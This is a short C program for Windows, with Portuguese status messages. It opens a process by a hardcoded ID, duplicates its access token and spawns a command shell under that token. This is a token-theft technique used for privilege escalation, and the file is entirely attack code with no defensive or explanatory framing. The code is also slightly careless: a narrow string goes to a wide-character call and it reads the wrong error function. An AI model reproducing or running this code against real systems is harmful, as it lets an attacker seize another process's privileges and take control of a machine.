#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winternl.h>
#include <winbase.h>
void  main()
{ 	char a;
	HANDLE processHandle;
	HANDLE tokenHandle ;
	HANDLE duplicateTokenHandle;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	DWORD PID_TO_IMPERSONATE =117880 ;
	char cmdline[] = "cmd.exe";
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID_TO_IMPERSONATE);
	if(processHandle==NULL){
        printf("Erro  ao  abrir  o  processo   %i  \n",WSAGetLastError());
	}
	else{
        printf(" porcesso  aberto  com  sucesso  \n");

	}
	 BOOL open=OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle);
	 if(open==TRUE){
        printf("openprocessToken  sucess  \n");
	 }
	 else{
        printf("openprocessToken  failed \n  %d",WSAGetLastError());
	 }

BOOL  dupl=	DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
	if(dupl==TRUE){
        printf(" duplicatetoken sucess \n");
	}
	else{
        printf("duplicate token failed %d",WSAGetLastError());
	}
BOOL createtoken=	CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation);
if(createtoken==TRUE){
    printf(" CreateProcessWtihTokenW   sucess  \n");
}
else{
    printf(" CreateProcessWtihTokenW   failed\n %d",WSAGetLastError());
}
   // return 0;







       }
